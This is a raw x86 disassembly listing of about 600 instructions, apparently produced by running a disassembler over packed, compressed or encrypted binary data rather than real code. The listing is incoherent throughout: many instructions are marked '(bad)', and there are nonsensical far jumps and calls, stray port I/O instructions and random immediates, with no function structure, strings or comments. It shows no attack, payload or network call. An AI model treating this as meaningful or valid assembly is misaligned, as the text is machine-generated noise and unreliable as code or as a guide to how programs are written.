  434b98:	scas   al,BYTE PTR es:[edi]
  434b99:	mov    cl,0x14
  434b9b:	inc    esi
  434b9c:	mov    edx,eax
  434b9e:	sbb    eax,0xeed15b51
  434ba3:	or     eax,0xd6bcc600
  434ba8:	ins    BYTE PTR es:[edi],dx
  434ba9:	ins    BYTE PTR es:[edi],dx
  434baa:	adc    al,0x6e
  434bac:	bound  edi,QWORD PTR [ebp+0x3212dc92]
  434bb2:	daa    
  434bb3:	retf   
  434bb4:	lds    ecx,FWORD PTR [esi+0x38012db8]
  434bba:	lds    edx,FWORD PTR [edi-0x62]
  434bbd:	(bad)  
  434bbe:	adc    DWORD PTR [ecx+0x75bb42e],ebx
  434bc4:	pop    ebp
  434bc5:	ins    BYTE PTR es:[edi],dx
  434bc6:	je     0x434bdc
  434bc8:	repnz loopne 0x434c2c
  434bcb:	add    al,0xc
  434bcd:	shr    DWORD PTR [ebp+0x1aca08ed],0xb1
  434bd4:	(bad)  
  434bd6:	std    
  434bd7:	mov    BYTE PTR [edx+0x18],al
  434bda:	push   0x31ec9757
  434bdf:	pop    esp
  434be0:	ss or  eax,0x50d68551
  434be6:	or     eax,0x1102185a
  434beb:	sub    eax,0xa7eaaec
  434bf0:	cmp    eax,0xb7e95808
  434bf5:	sbb    cl,BYTE PTR [edx+0x4fe0bada]
  434bfb:	push   ecx
  434bfc:	popa   
  434bfd:	pop    ebx
  434bfe:	iret   
  434bff:	call   0x48422df
  434c04:	pop    edx
  434c05:	cdq    
  434c06:	sbb    eax,0xad7db99b
  434c0b:	scas   al,BYTE PTR es:[edi]
  434c0c:	stos   BYTE PTR es:[edi],al
  434c0d:	outs   dx,BYTE PTR ds:[esi]
  434c0e:	sub    bl,BYTE PTR [ecx+0x3f]
  434c11:	clc    
  434c12:	inc    esi
  434c13:	mov    dl,0xdb
  434c15:	add    eax,0x9ed0b740
  434c1a:	fild   DWORD PTR [edi]
  434c1c:	je     0x434c36
  434c1e:	retf   
  434c1f:	outs   dx,BYTE PTR ds:[esi]
  434c20:	mov    al,0x40
  434c22:	mov    ah,0x5b
  434c24:	in     al,dx
  434c25:	call   FWORD PTR [ebx-0x4f2180c8]
  434c2b:	mov    ch,0x5d
  434c2d:	adc    eax,0xe34a2bd2
  434c32:	and    dh,cl
  434c34:	ins    DWORD PTR es:[edi],dx
  434c35:	pop    ebx
  434c36:	fidiv  DWORD PTR [edx-0x59]
  434c39:	xor    al,0xae
  434c3b:	push   eax
  434c3c:	push   ebx
  434c3d:	jmp    0xb1ee233
  434c42:	(bad)  [ebp-0x1ad8dc2b]
  434c48:	and    esp,DWORD PTR [edx+ecx*8]
  434c4b:	mov    esp,fs
  434c4d:	mov    dh,0xa5
  434c4f:	test   DWORD PTR [ebp-0x2387f78b],ebp
  434c55:	push   esi
  434c56:	fiadd  WORD PTR [edi]
  434c58:	repz rol DWORD PTR [ecx+0x19d04d80],1
  434c5f:	pop    ebx
  434c60:	stc    
  434c61:	mov    esi,0x7680370b
  434c66:	inc    ecx
  434c67:	mov    ch,0xab
  434c69:	pop    ebx
  434c6a:	and    ebp,DWORD PTR [edi]
  434c6c:	rcl    DWORD PTR [si-0x4c],1
  434c70:	stos   DWORD PTR es:[edi],eax
  434c71:	je     0x434c6f
  434c73:	push   cs
  434c74:	movups xmm6,XMMWORD PTR [ebx+ecx*1+0x130fb4ba]
  434c7c:	pop    ecx
  434c7d:	shl    esi,0xd4
  434c80:	out    0x5e,eax
  434c82:	jmp    0x259b:0xc50536d6
  434c89:	mov    edi,0x6ef2a91d
  434c8e:	sub    eax,0xd4a52ba8
  434c93:	push   ebx
  434c94:	xor    eax,0xaa3a2a05
  434c99:	loopne 0x434c71
  434c9b:	mov    WORD PTR [eax],?
  434c9d:	imul   ebx,DWORD PTR [esi],0x51
  434ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ca1:	add    DWORD PTR [ebx+0x22c6068a],edi
  434ca7:	pushf  
  434ca8:	fist   DWORD PTR [ebx-0x60]
  434cab:	fcmovnbe st,st(6)
  434cad:	push   ecx
  434cae:	mov    edi,0x2cd8a144
  434cb3:	mov    ds:0x6da05d32,al
  434cb8:	sub    bl,0x93
  434cbb:	outs   dx,BYTE PTR ds:[esi]
  434cbc:	fwait
  434cbd:	loope  0x434c73
  434cbf:	cld    
  434cc0:	fcom   DWORD PTR [ecx+edx*8-0x53]
  434cc4:	(bad)  
  434cc5:	imul   edx,ebx,0xfffffff9
  434cc8:	jp     0x434c4b
  434cca:	test   al,0x4
  434ccc:	shr    DWORD PTR [esi],0xa0
  434ccf:	add    al,0xf
  434cd1:	and    DWORD PTR [eax-0x2425fd16],edi
  434cd7:	(bad)
  434cda:	sub    dh,bh
  434cdc:	sub    eax,0x186d5b50
  434ce1:	mov    ebx,0x429f0b35
  434ce6:	add    al,0xb7
  434ce8:	(bad)  
  434ce9:	lods   eax,DWORD PTR ds:[esi]
  434cea:	dec    ebp
  434ceb:	cmp    esp,0x43
  434cee:	ins    DWORD PTR es:[edi],dx
  434cef:	cmp    ebx,DWORD PTR [ebp+0x6b]
  434cf2:	jne    0x434cf4
  434cf4:	ror    DWORD PTR [edx+ecx*2],1
  434cf7:	loope  0x434d05
  434cf9:	dec    esi
  434cfa:	push   0xffffff9b
  434cfc:	sub    BYTE PTR [edx-0x6939cddd],bh
  434d02:	pushf  
  434d03:	push   edx
  434d04:	es jne 0x434cb8
  434d07:	ins    DWORD PTR es:[edi],dx
  434d08:	add    eax,0x65891d92
  434d0d:	ja     0x434cf9
  434d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434d10:	sbb    ebp,DWORD PTR ds:0x6d7f685a
  434d16:	jno    0x434d13
  434d18:	add    BYTE PTR [edx],bh
  434d1a:	add    BYTE PTR [esi],dh
  434d1c:	outs   dx,BYTE PTR ds:[esi]
  434d1d:	dec    ebx
  434d1e:	das    
  434d1f:	jb     0x434d29
  434d21:	sti    
  434d22:	int3   
  434d23:	mov    ds:0xdb1047d9,al
  434d28:	xchg   BYTE PTR [eax+0x46],ch
  434d2b:	out    0x8c,al
  434d2d:	enter  0x8520,0x2
  434d31:	xchg   ebp,eax
  434d32:	pop    ebx
  434d33:	or     BYTE PTR [edx-0x46],0x8d
  434d37:	(bad)  
  434d39:	mov    edx,0xe48a85b5
  434d3e:	xchg   ebx,eax
  434d3f:	and    BYTE PTR [edx+0x11],0x71
  434d43:	push   ss
  434d44:	pop    ss
  434d45:	mov    dh,0xba
  434d47:	or     al,BYTE PTR [edx]
  434d49:	dec    ecx
  434d4a:	add    eax,esp
  434d4c:	push   ebp
  434d4d:	sbb    BYTE PTR [esi+eax*4],dl
  434d50:	test   al,0x36
  434d52:	add    BYTE PTR [eax],al
  434d54:	lods   eax,DWORD PTR ds:[esi]
  434d55:	inc    esp
  434d56:	rcr    edx,cl
  434d58:	add    DWORD PTR [ebx+ebx*8],eax
  434d5b:	pop    esi
  434d5c:	and    esi,DWORD PTR [eax-0x64bd3eed]
  434d62:	adc    BYTE PTR [ecx-0x5f],dh
  434d65:	mov    edx,DWORD PTR [edx]
  434d67:	push   esp
  434d68:	cs dec ebp
  434d6a:	packssdw mm4,QWORD PTR [ebx-0x15]
  434d6e:	ret    0x5a71
  434d71:	jmp    0x434dc9
  434d73:	cmp    bh,ah
  434d75:	shr    dh,0xaa
  434d78:	sbb    eax,0x96fd7410
  434d7d:	ret    
  434d7e:	stc    
  434d7f:	inc    esi
  434d80:	push   eax
  434d81:	stos   DWORD PTR es:[edi],eax
  434d82:	test   al,0x81
  434d84:	(bad)  
  434d86:	inc    edi
  434d87:	fadd   DWORD PTR [ecx]
  434d89:	jno    0x434df6
  434d8b:	dec    ecx
  434d8c:	stos   BYTE PTR es:[edi],al
  434d8d:	fwait
  434d8e:	xchg   esi,eax
  434d8f:	jp     0x434d14
  434d91:	std    
  434d92:	sub    ebp,DWORD PTR [ebx+edi*4-0x5e]
  434d96:	pop    edx
  434d98:	mov    ebx,0xbce22986
  434d9d:	cs je  0x434de5
  434da0:	jno    0x434deb
  434da2:	push   esp
  434da3:	in     al,dx
  434da4:	cmp    BYTE PTR [esi+0x3d],bl
  434da7:	and    dh,BYTE PTR [esi-0x1ddd14a]
  434dad:	adc    eax,DWORD PTR [eax+0x4433587c]
  434db3:	pop    esp
  434db4:	ficom  DWORD PTR [esi+0x3f7dabda]
  434dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434dbb:	aaa    
  434dbc:	add    eax,DWORD PTR [ebp+0x2b74042a]
  434dc2:	adc    edi,ecx
  434dc4:	or     al,BYTE PTR [edi-0x4f]
  434dc7:	add    DWORD PTR [eax-0x4b0d952e],0xdb1034fe
  434dd1:	push   es
  434dd2:	add    al,0xe6
  434dd4:	inc    ecx
  434dd5:	xchg   edx,eax
  434dd6:	jmp    0x71841d2
  434ddb:	mov    BYTE PTR [esi],ch
  434ddd:	cli    
  434dde:	call   0x4341:0x1f6ab206
  434de5:	dec    ebx
  434de6:	dec    ebp
  434de7:	xor    al,0xb4
  434de9:	loopne 0x434e1b
  434deb:	add    ch,ah
  434ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434dee:	ins    DWORD PTR es:[edi],dx
  434def:	(bad)  [esi]
  434df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434df2:	psraw  mm4,QWORD PTR [ebp+0x2e]
  434df6:	push   eax
  434df7:	ficom  WORD PTR [ebx+edi*2]
  434dfa:	outs   dx,BYTE PTR ds:[esi]
  434dfb:	(bad)  
  434dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434dfd:	add    ch,BYTE PTR [eax+edi*8+0x25]
  434e01:	call   0xa57a1c4a
  434e06:	xor    edx,DWORD PTR [ebp-0x60]
  434e09:	mov    dh,0x2c
  434e0b:	jnp    0x434dca
  434e0d:	adc    eax,0xc515d5d1
  434e12:	ins    DWORD PTR es:[edi],dx
  434e13:	into   
  434e14:	xlat   BYTE PTR ds:[ebx]
  434e15:	cmp    BYTE PTR [ebx+0x1d],dh
  434e18:	or     eax,0x6e0803ad
  434e1d:	add    BYTE PTR [esi],0x1
  434e20:	out    dx,al
  434e21:	scas   al,BYTE PTR es:[edi]
  434e22:	aam    0xa0
  434e24:	pusha  
  434e25:	push   edi
  434e26:	les    edi,FWORD PTR [ebx]
  434e28:	aam    0x35
  434e2a:	pop    edi
  434e2b:	jno    0x434e7e
  434e2d:	shr    BYTE PTR [ebp-0x6da84d46],1
  434e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e35:	push   cs
  434e36:	call   0xb4351ff1
  434e3b:	sbb    esi,ebp
  434e3d:	cmp    esi,DWORD PTR [esp+edi*2+0x1]
  434e41:	pop    ebp
  434e42:	inc    esp
  434e43:	ins    DWORD PTR es:[edi],dx
  434e44:	mov    bh,0x8c
  434e46:	sbb    eax,0xce3b2883
  434e4b:	inc    eax
  434e4c:	pop    eax
  434e4d:	adc    BYTE PTR [edx+ecx*1],dh
  434e50:	dec    ebx
  434e51:	sbb    eax,0xb6714386
  434e56:	(bad)  
  434e57:	push   ebp
  434e58:	pop    es
  434e59:	rcr    BYTE PTR [ebp+0x35294f20],1
  434e5f:	stos   DWORD PTR es:[edi],eax
  434e60:	adc    DWORD PTR [edi+0x248eb68d],esi
  434e66:	mov    ch,0x7a
  434e68:	or     BYTE PTR [edx-0x7d],cl
  434e6b:	mov    ah,0x2b
  434e6d:	and    dh,BYTE PTR [esi-0x9]
  434e70:	mul    DWORD PTR ds:0x6e31c073
  434e76:	mov    ah,0x5d
  434e78:	push   ecx
  434e79:	mov    ds,WORD PTR [eax]
  434e7b:	je     0x434e27
  434e7d:	push   es
  434e7e:	xchg   esi,eax
  434e7f:	fld    TBYTE PTR [ebx-0x49]
  434e82:	push   es
  434e83:	sbb    dh,0xd0
  434e86:	xlat   BYTE PTR ds:[ebx]
  434e87:	(bad)  
  434e88:	aas    
  434e89:	add    BYTE PTR [edi-0x78],0x5d
  434e8d:	adc    DWORD PTR [ecx+0x51],esi
  434e90:	ss int 0x1e
  434e93:	mov    eax,0xa9ab70b5
  434e98:	mov    ecx,0xd7cd1c6f
  434e9d:	sar    esi,0x2c
  434ea0:	adc    al,0x36
  434ea2:	adc    al,0xfc
  434ea4:	mov    dh,0xad
  434ea6:	mov    ds:0xb6c13973,eax
  434eab:	mov    ch,0x4b
  434ead:	ins    DWORD PTR es:[edi],dx
  434eae:	(bad)  
  434eaf:	jbe    0x9e151153
  434eb5:	push   esp
  434eb6:	ins    DWORD PTR es:[edi],dx
  434eb7:	mov    bh,0xcd
  434eb9:	mov    WORD PTR [esi+ebp*1-0x3e],gs
  434ebd:	addr16 pusha 
  434ebf:	bound  ebx,QWORD PTR [ecx+0x1db609a1]
  434ec5:	sbb    eax,0x3a205d4b
  434eca:	sbb    eax,0x2c2e9763
  434ecf:	fbld   TBYTE PTR [edx+0x7d]
  434ed2:	mov    edx,0xa4007a6c
  434ed7:	cmp    ch,BYTE PTR [eax]
  434ed9:	enter  0x1758,0x36
  434edd:	sbb    al,BYTE PTR [eax]
  434edf:	popa   
  434ee0:	inc    esp
  434ee1:	movntq QWORD PTR [edi+eax*1+0x75bb540],mm2
  434ee9:	inc    ecx
  434eea:	(bad)  
  434eec:	sbb    al,ah
  434eee:	std    
  434eef:	inc    ecx
  434ef0:	adc    DWORD PTR [edi-0x130a5cba],esi
  434ef6:	add    eax,DWORD PTR [esi+0x71156d43]
  434efc:	loope  0x434f03
  434efe:	je     0x434e88
  434f00:	imul   ebp,DWORD PTR [eax-0x2924bb93],0xb3b5659
  434f0a:	into   
  434f0b:	pop    ds
  434f0c:	mov    cl,0x33
  434f0e:	ins    BYTE PTR es:[edi],dx
  434f0f:	or     eax,0xa17dadd5
  434f14:	and    esi,ebp
  434f16:	mov    bl,0x40
  434f18:	dec    edx
  434f19:	test   eax,0xb57058d
  434f1e:	ret    
  434f1f:	scas   eax,DWORD PTR es:[edi]
  434f20:	push   esi
  434f21:	sub    BYTE PTR [eax-0x61],ch
  434f24:	imul   ebx,DWORD PTR [ebx],0x37
  434f27:	mov    dh,0xd7
  434f29:	xchg   ebp,eax
  434f2a:	aas    
  434f2b:	shl    cl,cl
  434f2d:	mov    esi,ds
  434f2f:	rcl    BYTE PTR [edx+0x5a81b8c],1
  434f35:	push   0x5e
  434f37:	mov    cl,0xd9
  434f39:	dec    eax
  434f3a:	sar    ch,1
  434f3c:	adc    BYTE PTR [esi+0x44d515da],ch
  434f42:	mov    edi,0x6e206d01
  434f47:	or     esp,DWORD PTR [esi+0x54]
  434f4a:	mov    ecx,0xdb0a1c4a
  434f4f:	imul   ebx,ebx,0x1a000356
  434f55:	enter  0x1cfa,0x65
  434f59:	lock dec ebp
  434f5b:	adc    DWORD PTR [edi],edx
  434f5d:	pop    esp
  434f5e:	inc    ebx
  434f5f:	mov    ebx,DWORD PTR ds:0x7244cc8f
  434f65:	ror    DWORD PTR [esi-0x6324f860],1
  434f6b:	repnz rol WORD PTR [ecx-0x24],1
  434f70:	add    cl,dh
  434f72:	mov    cl,0x3d
  434f74:	sar    BYTE PTR [ebp-0x4917fe57],0x9
  434f7b:	fcmovu st,st(5)
  434f7d:	sbb    BYTE PTR [edx+eiz*2],dh
  434f80:	stc    
  434f81:	mov    bl,0x15
  434f83:	ds mov cl,0x75
  434f86:	adc    dl,BYTE PTR [eax]
  434f88:	fs xchg esp,eax
  434f8a:	std    
  434f8b:	repnz bound eax,QWORD PTR [ebx+0x8]
  434f8f:	push   ss
  434f90:	adc    BYTE PTR [edx-0x5f],0xa1
  434f94:	and    ebx,DWORD PTR [ebx+0x3]
  434f97:	push   eax
  434f98:	fwait
  434f99:	mov    bh,0x8a
  434f9b:	fwait
  434f9c:	lahf   
  434f9d:	addr16 mov esp,0x6b6dc153
  434fa3:	mov    BYTE PTR [esi],ah
  434fa5:	aas    
  434fa6:	mov    esp,0xa256dc80
  434fab:	retf   
  434fac:	scas   al,BYTE PTR es:[edi]
  434fad:	sub    BYTE PTR [esi],dh
  434faf:	push   ebp
  434fb0:	mov    edi,0x6d0b3c17
  434fb5:	pop    es
  434fb6:	aam    0x85
  434fb8:	sbb    ebp,DWORD PTR [esi]
  434fba:	push   ebp
  434fbb:	in     eax,0xcf
  434fbd:	sbb    ebp,ebp
  434fbf:	imul   ebp,DWORD PTR [ebp-0x50a44bbc],0x2f
  434fc6:	inc    ecx
  434fc7:	dec    edx
  434fc8:	or     esi,DWORD PTR [edx]
  434fca:	ss adc ecx,edx
  434fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434fce:	scas   al,BYTE PTR es:[edi]
  434fcf:	xchg   BYTE PTR [esi+0x2e593278],cl
  434fd5:	adc    ah,dl
  434fd7:	scas   al,BYTE PTR es:[edi]
  434fd8:	mov    al,ds:0x587292f
  434fdd:	mov    al,0x5
  434fdf:	shl    DWORD PTR [ebp+0x45],1
  434fe2:	fild   DWORD PTR [eax-0x47]
  434fe5:	mov    ch,0xb0
  434fe7:	jne    0x43502d
  434fe9:	cmp    esi,edx
  434feb:	mov    edx,0x74044b07
  434ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434ff1:	adc    esp,eax
  434ff3:	push   esi
  434ff4:	push   esp
  434ff5:	stc    
  434ff6:	inc    edi
  434ff7:	adc    eax,0xdad8aaec
  434ffc:	adc    esi,DWORD PTR [ecx+0x69]
  434fff:	mov    dl,0x2d
  435001:	sub    edi,DWORD PTR [eax-0x3ad2b293]
  435007:	fwait
  435008:	lods   al,BYTE PTR ds:[esi]
  435009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43500a:	inc    edi
  43500b:	cs push eax
  43500d:	(bad)  
  43500e:	xchg   BYTE PTR [ebx-0x76ebf64a],cl
  435014:	mov    ah,0x57
  435016:	ret    0xb7e2
  435019:	scas   al,BYTE PTR es:[edi]
  43501a:	loop   0x434fde
  43501c:	xor    DWORD PTR [edi],0x98ff29cd
  435022:	xor    ch,BYTE PTR ds:0x1d808e57
  435028:	adc    DWORD PTR [eax+0x27],ebx
  43502b:	jle    0x434fad
  43502d:	sub    eax,0xe8b70174
  435032:	inc    edi
  435033:	inc    ebx
  435034:	ret    
  435035:	push   ecx
  435036:	popf   
  435037:	sbb    al,0x3e
  435039:	fcmovnu st,st(2)
  43503b:	mov    dh,0x55
  43503d:	jmp    0xc86b2b36
  435042:	sahf   
  435043:	popa   
  435044:	mov    al,0xea
  435046:	(bad)  
  435047:	push   esp
  435048:	je     0x4350a2
  43504a:	test   BYTE PTR [ecx],cl
  43504c:	out    0x32,al
  43504e:	into   
  43504f:	daa    
  435050:	pop    ebp
  435051:	inc    ecx
  435052:	mov    al,0x83
  435054:	fnstcw WORD PTR [esi-0x3a]
  435057:	cmp    BYTE PTR [ebx+edi*1-0x527a69de],0xd
  43505f:	push   0xe
  435061:	in     eax,0x50
  435063:	add    DWORD PTR [edx-0x589254a0],esp
  435069:	ror    BYTE PTR [edx-0x54],cl
  43506c:	div    DWORD PTR [ebp+0xd55b1b1]
  435072:	pop    esi
  435073:	adc    eax,0x3dededf9
  435078:	cs mov ch,0xa6
  43507b:	inc    edx
  43507c:	and    edi,DWORD PTR [ebx]
  43507e:	jbe    0x435039
  435080:	je     0x4350a3
  435082:	or     ch,BYTE PTR [ebp+0x71db6023]
  435088:	popf   
  435089:	mov    esp,0xf5887d86
  43508e:	inc    ecx
  43508f:	pop    ss
  435090:	mov    dh,0x85
  435092:	push   ds
  435093:	popa   
  435094:	aad    0x8c
  435096:	pushf  
  435097:	jbe    0x4350c7
  435099:	retf   0x83b
  43509c:	push   0x6e0d4f13
  4350a1:	fwait
  4350a2:	adc    al,0x4c
  4350a4:	mov    eax,0xb5405760
  4350a9:	jne    0x435100
  4350ab:	mov    ch,0x2d
  4350ad:	mov    edi,0x3aec15b0
  4350b2:	pop    esi
  4350b3:	neg    dl
  4350b5:	add    BYTE PTR [edi-0x4f4ed659],cl
  4350bb:	jne    0x4350be
  4350bd:	(bad)  
  4350be:	outs   dx,BYTE PTR ds:[esi]
  4350bf:	push   0x164c3186
  4350c4:	sbb    dl,0x52
  4350c7:	popf   
  4350c8:	sub    cl,BYTE PTR [eax]
  4350ca:	clc    
  4350cb:	adc    BYTE PTR [eax-0x2f],dl
  4350ce:	push   ss
  4350cf:	sar    BYTE PTR [ebx],1
  4350d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4350d2:	or     edx,ebx
  4350d4:	xchg   BYTE PTR [edx-0x274c7428],cl
  4350da:	jecxz  0x435141
  4350dc:	mov    eax,ds:0x1143684a
  4350e1:	aaa    
  4350e2:	pusha  
  4350e3:	hlt    
  4350e4:	add    DWORD PTR [edx-0x23d20948],ebx
  4350ea:	call   0xb574:0xa7cfce02
  4350f1:	xor    al,0x31
  4350f3:	fiadd  DWORD PTR [edx]
  4350f5:	rcl    BYTE PTR ds:0x2187d5ca,1
  4350fb:	pop    edi
  4350fc:	mov    ebx,0x34b755d0
  435101:	ss das 
  435103:	hlt    
  435104:	cmp    DWORD PTR [esi+0x34],eax
  435107:	or     BYTE PTR [eax],bh
  435109:	push   0x9b6db628
  43510e:	push   cs
  43510f:	cmp    edx,edi
  435111:	aam    0x72
  435113:	cmp    eax,DWORD PTR [ebx+0x5f2b6da7]
  435119:	xlat   BYTE PTR ds:[ebx]
  43511a:	adc    ebp,ecx
  43511c:	repnz and al,BYTE PTR [esi+0x71404db6]
  435123:	add    DWORD PTR [edx-0x23],ebx
  435126:	pusha  
  435127:	mov    edi,0x2ed607c8
  43512c:	xchg   esp,eax
  43512d:	sub    esp,DWORD PTR [ebp-0x5e2fa6e4]
  435133:	stos   BYTE PTR es:[edi],al
  435134:	push   0x59c12c03
  435139:	adc    al,0x8a
  43513b:	sub    BYTE PTR [eax+0x17100d7f],ch
  435141:	cmp    bh,ch
  435143:	add    dl,BYTE PTR [ecx-0x26129e5d]
  435149:	sbb    BYTE PTR [ebx],0x8d
  43514c:	sbb    edi,DWORD PTR [edx-0x69cc153f]
  435152:	sub    eax,0xaddb7c5e
  435157:	adc    DWORD PTR [ecx-0xe],0x4ac17495
  43515e:	cmp    esp,DWORD PTR [ecx+0x2021a1d5]
  435164:	cs mov eax,0xcb74e39f
  43516a:	sub    BYTE PTR [ebp+ecx*1+0x41],ch
  43516e:	je     0x435174
  435170:	xlat   BYTE PTR ds:[ebx]
  435171:	(bad)  
  435174:	or     al,0x5
  435176:	test   al,0x8b
  435178:	cs mov ebx,0x17687557
  43517e:	ret    0xdba2
  435181:	push   es
  435182:	sbb    esp,DWORD PTR [ebx-0x33]
  435185:	(bad)  
  435186:	sub    ah,BYTE PTR [eax]
  435188:	ret    
  435189:	jecxz  0x4351df
  43518b:	ins    DWORD PTR es:[edi],dx
  43518c:	mov    bh,0x6
  43518e:	mov    ebp,0x2cabbcfc
  435193:	jmp    0x82ca21dd
  435198:	pop    ebp
  435199:	dec    ebx
  43519a:	test   eax,0x169b4f5c
  43519f:	or     bl,BYTE PTR [eax-0x58]
  4351a2:	or     al,0x65
  4351a4:	das    
  4351a5:	lock sub ah,al
  4351a8:	mov    dh,0xd1
  4351aa:	aas    
  4351ab:	fstp   TBYTE PTR [eax+0x56]
  4351ae:	enter  0xa0c9,0xda
  4351b2:	and    BYTE PTR [edx+0x31001f07],bl
  4351b8:	ins    BYTE PTR es:[edi],dx
  4351b9:	aaa    
  4351ba:	ss mov edx,0x35e421e0
  4351c0:	xchg   edi,esi
  4351c2:	fcmovne st,st(6)
  4351c4:	shr    ebx,1
  4351c6:	push   edx
  4351c7:	push   edi
  4351c8:	add    eax,0x5f5990c6
  4351cd:	mov    esp,0xbbeb697
  4351d2:	pop    ebx
  4351d3:	sbb    eax,DWORD PTR gs:[edx+0x60e3bf7c]
  4351da:	popa   
  4351db:	or     DWORD PTR [ebp+0x47],ebp
  4351de:	adc    DWORD PTR [edi],esi
  4351e0:	push   esp
  4351e1:	arpl   WORD PTR [esi-0x7056df76],dx
  4351e7:	pop    ebx
  4351e8:	push   0xdef40d6c
  4351ed:	xlat   BYTE PTR ds:[ebx]
  4351ee:	ret    0xf74b
  4351f1:	xchg   esp,eax
  4351f2:	into   
  4351f3:	pop    ebx
  4351f4:	mov    dh,BYTE PTR [esi+0x38d3a474]
  4351fa:	stc    
  4351fb:	stos   BYTE PTR es:[edi],al
  4351fc:	mov    al,ds:0x510d26b7
  435201:	lock arpl WORD PTR [edx+eiz*4+0x63],cx
  435206:	xor    DWORD PTR [ebp-0x70],0xa21ad8dd
  43520d:	dec    edi
  43520e:	cmp    dh,BYTE PTR [edx]
  435210:	repnz les ebx,FWORD PTR [eax]
  435213:	mov    eax,0x47622311
  435218:	adc    BYTE PTR [eax-0x7f],bl
  43521b:	pop    eax
  43521c:	push   0x74
  43521e:	rcl    edx,0xad
  435221:	iret   
  435222:	clc    
  435223:	imul   eax,esp,0xe34f8232
  435229:	or     BYTE PTR [eax-0x42f69250],bh
  43522f:	push   ebx
  435230:	or     al,0x37
  435232:	(bad)  
  435233:	leave  
  435234:	add    al,0xb7
  435236:	mov    dh,0x26
  435238:	fldl2e 
  43523a:	or     BYTE PTR [ebx-0x2d],al
  43523d:	clc    
  43523e:	lock mov ds:0xff1346e2,al
  435244:	lds    edx,FWORD PTR [eax-0x23f42199]
  43524a:	push   ss
  43524b:	sbb    ah,BYTE PTR [edi+0x383016dc]
  435251:	dec    edx
  435252:	fidivr DWORD PTR [edi]
  435254:	adc    ch,BYTE PTR [eax-0x11d2be28]
  43525a:	pop    ss
  43525b:	ret    0x6b0d
  43525e:	push   ecx
  43525f:	test   DWORD PTR [eax+0x15],ebp
  435262:	(bad)  
  435263:	adc    cl,BYTE PTR [ebp+0x147622b9]
  435269:	jne    0x435209
  43526b:	adc    al,0xaa
  43526d:	repnz cli 
  43526f:	test   al,0xe0
  435271:	pop    es
  435272:	sbb    esi,DWORD PTR ds:0x6e178fe3
  435278:	test   BYTE PTR [ebp+0x59bb140d],al
  43527e:	mov    edi,0x6f688d6
  435283:	or     cl,BYTE PTR ds:0xf4b406c1
  435289:	(bad)
  43528d:	lahf   
  43528e:	sub    BYTE PTR [eax-0x45],0x6d
  435292:	pop    ecx
  435293:	mov    ecx,0x8c328995
  435298:	and    al,bl
  43529a:	push   eax
  43529b:	inc    esp
  43529c:	sbb    esp,DWORD PTR [edi+0x44008d48]
  4352a2:	data16 test al,0xda
  4352a5:	lods   eax,DWORD PTR ds:[esi]
  4352a6:	or     esp,edi
  4352a8:	xor    BYTE PTR [edx],bl
  4352aa:	scas   al,BYTE PTR es:[edi]
  4352ab:	mov    BYTE PTR [esi-0x46],ch
  4352ae:	or     BYTE PTR [eax+0x47e8a450],bh
  4352b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4352b5:	jl     0x43528a
  4352b7:	or     bh,BYTE PTR [eax+0x1faea050]
  4352bd:	pop    ebx
  4352be:	jmp    0x4352c4
  4352c0:	ins    DWORD PTR es:[edi],dx
  4352c1:	pop    ss
  4352c2:	cmp    dh,BYTE PTR [ebx-0x15e23b20]
  4352c8:	sbb    eax,0xb015b479
  4352cd:	jne    0x435347
  4352cf:	call   0x35ba:0x1aea43e0
  4352d6:	add    eax,0x770205b4
  4352db:	out    0xbc,eax
  4352dd:	fisubr WORD PTR [ecx]
  4352df:	in     eax,dx
  4352e0:	mov    dh,0x1
  4352e2:	xchg   BYTE PTR [eax+0x3bfefcb7],bh
  4352e8:	ja     0x435334
  4352ea:	push   esp
  4352eb:	sbb    ebx,DWORD PTR [ebx]
  4352ed:	lea    edx,[ecx-0x19]
  4352f0:	in     eax,dx
  4352f1:	std    
  4352f2:	sbb    BYTE PTR [ebp-0x52525a7b],bl
  4352f8:	add    eax,0xb494e398
  4352fd:	mov    eax,ds:0x75ba7cd9
  435302:	add    ebp,eax
  435304:	lods   eax,DWORD PTR ds:[esi]
  435305:	mov    dl,0xf1
  435307:	xor    eax,0xeb718c65
  43530c:	push   0x1b
  43530e:	and    dl,ah
  435310:	mov    ch,0x46
  435312:	sub    DWORD PTR [edi+0x42],esp
  435315:	rol    DWORD PTR [edi],1
  435317:	adc    eax,0x4c85601b
  43531c:	sub    edx,DWORD PTR [eax]
  43531e:	xchg   ebx,eax
  43531f:	mov    dh,0x11
  435321:	sbb    DWORD PTR [eax+0x43],ebp
  435324:	popf   
  435325:	fstp   QWORD PTR [eax]
  435327:	loope  0x43538e
  435329:	push   0x41f960ab
  43532e:	lock add BYTE PTR [edi+0x6d04589e],bh
  435335:	fld    TBYTE PTR [ebp-0x40d42f7]
  43533b:	jmp    0x3f2f:0x95ab50a6
  435342:	fdiv   DWORD PTR [esi+0x45]
  435345:	mov    ebp,0xaf74e256
  43534a:	enter  0x4c88,0x22
  43534e:	fcom   DWORD PTR [ecx+0x40]
  435351:	or     eax,0x4476cee
  435356:	mov    bh,0x2e
  435358:	xor    BYTE PTR [edi],dh
  43535a:	inc    esp
  43535b:	mov    al,0x30
  43535d:	out    0xa,eax
  43535f:	mov    ebx,0xb0f85baa
  435364:	in     eax,0x18
  435366:	jmp    0x80b40c19
  43536b:	push   edi
  43536c:	pop    ss
  43536d:	push   ss
  43536e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43536f:	test   BYTE PTR [ecx],dh
  435371:	adc    al,0x2e
  435373:	mov    DWORD PTR [esi-0x10],edx
  435376:	shr    BYTE PTR ds:0x814a2d82,0x30
  43537d:	cmp    BYTE PTR [edi-0x48252253],dh
  435383:	mov    al,0x53
  435385:	jp     0x4353d9
